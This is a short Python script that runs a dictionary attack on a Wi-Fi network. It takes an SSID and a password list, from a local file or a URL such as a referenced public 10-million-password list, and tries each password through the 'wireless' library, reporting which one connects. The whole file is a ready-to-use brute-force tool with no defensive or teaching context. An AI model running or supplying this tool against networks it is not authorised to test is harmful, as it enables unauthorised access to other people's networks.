import sys
import urllib.request

from wireless import Wireless

# ssid = input("SSID: ")
# if not ssid:
#     raise SystemExit("missing SSID, cannot continue")

try:
    ssid = sys.argv[1]
    passwordfile = sys.argv[2]
except IndexError:
    print(f"Syntax {sys.argv[0]} ssid password_file_path_or_url")
    exit()

try:
    #  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords.txt
    file = urllib.request.urlopen(passwordfile)
    print(f"urllib: {passwordfile} is open")
except:
    print(f"urllib cannot open {passwordfile}")
    try:
        file = open(passwordfile)
        print(f"open: {passwordfile} is open")
    except:
        print(f"cannot open {passwordfile}")
        exit()


wire = Wireless()

for line in file:
    password = line.strip()
    if wire.connect(ssid=ssid, password=password):
        print(f"SUCCESS: {ssid=} {password}")
    else:
        print(f"FAILURE: {ssid=} {password}")
